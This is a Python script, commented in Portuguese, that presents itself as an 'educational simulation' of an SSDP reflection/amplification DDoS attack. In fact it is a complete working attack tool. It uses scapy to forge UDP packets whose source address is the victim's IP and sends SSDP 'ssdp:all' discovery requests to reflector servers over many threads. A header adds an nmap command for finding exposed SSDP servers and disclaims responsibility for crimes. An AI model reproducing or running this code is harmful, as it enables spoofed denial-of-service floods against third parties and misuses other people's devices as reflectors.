'''
###################################################### DISCLAIMER #######################################################
|  Comando para identificar se seu servidor está aberto:                                                                |
|  nmap -sU -p 1900 <target>                                                                                            |
|  Simulação educacional de DRDoS usando o protocolo SSDP.                                                              |
|  Para mais informações sobre ataques de amplificação SSDP, consulte:                                                  |
|  https://owasp.org/www-project-internet-of-things/                                                                    |
|  I am NOT responsible for any damages caused or any crimes committed by using this tool.                              |
#########################################################################################################################
'''

from scapy.all import IP, UDP, send
from concurrent.futures import ThreadPoolExecutor

def simulate_ssdp_dr_dos(target_ip, ssdp_server, num_packets=10):
    """
    Simula um ataque DRDoS SSDP para fins educativos.
    :param target_ip: IP da vítima que receberá os pacotes amplificados.
    :param ssdp_server: Servidor SSDP vulnerável para enviar as solicitações.
    :param num_packets: Número de pacotes a serem enviados.
    """
    ssdp_payload = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST:239.255.255.250:1900\r\n"
        "ST:ssdp:all\r\n"
        "MAN:\"ssdp:discover\"\r\n"
        "MX:3\r\n\r\n"
    )
    for i in range(num_packets):
        # Construindo o pacote UDP para o ataque DRDoS
        packet = (
            IP(src=target_ip, dst=ssdp_server) /
            UDP(sport=12345, dport=1900) /  # Porta de origem aleatória, destino 1900 (SSDP)
            ssdp_payload.encode('utf-8')
        )
        print(f"[{i+1}/{num_packets}] Enviando pacote para {ssdp_server} como se fosse de {target_ip}...")
        send(packet, verbose=0)

def simulate_ssdp_dr_dos_multiple(target_ip, ssdp_servers, num_packets_per_server=10, num_threads=4):
    """
    Simula um ataque DRDoS SSDP contra múltiplos servidores simultaneamente.
    :param target_ip: IP da vítima que receberá os pacotes amplificados.
    :param ssdp_servers: Lista de servidores SSDP vulneráveis para enviar as solicitações.
    :param num_packets_per_server: Número de pacotes a serem enviados por servidor.
    :param num_threads: Número de threads a serem usadas para execução paralela.
    """
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [
            executor.submit(simulate_ssdp_dr_dos, target_ip, ssdp_server, num_packets_per_server)
            for ssdp_server in ssdp_servers
        ]
        # Espera todas as threads finalizarem
        for future in futures:
            future.result()

if __name__ == "__main__":
    TARGET_IP = "192.168.1.1"  # IP da vítima (falsificado)
    SSDP_SERVERS = [
    "192.168.1.2","192.168.1.3"
]
  # Lista de servidores SSDP vulneráveis
    NUM_PACKETS_PER_SERVER = 500  # Número de pacotes a enviar por servidor
    NUM_THREADS = 10  # Número de threads para paralelismo

    print("Simulando ataque DRDoS SSDP...")
    simulate_ssdp_dr_dos_multiple(TARGET_IP, SSDP_SERVERS, NUM_PACKETS_PER_SERVER, NUM_THREADS)
    print("Simulação concluída.")
